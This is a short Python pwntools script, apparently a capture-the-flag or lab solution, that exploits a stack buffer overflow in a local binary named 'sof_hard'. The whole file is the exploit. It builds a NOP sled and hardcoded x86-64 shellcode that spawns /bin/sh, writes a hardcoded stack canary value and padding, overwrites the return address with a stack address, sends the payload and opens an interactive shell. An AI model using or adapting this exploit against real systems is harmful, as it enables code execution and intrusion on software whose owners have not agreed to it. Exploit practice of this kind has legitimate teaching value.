from pwn import *

# my Canary address 0x7fffffffe138
# binary Canary address 0x7fffffffe130

ret = 0x7fffffffe0d8 

#shellcode = asm(shellcraft.sh())
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = "\x90"*(0x90-0x10-len(shellcode))
payload += shellcode
payload += p64(0x4541af8e403f2abc)

payload += 'A'*16 +  p64(ret) # trash 8byte
p = process('./sof_hard')

p.send(payload)

pause()

p.interactive()
p.close()
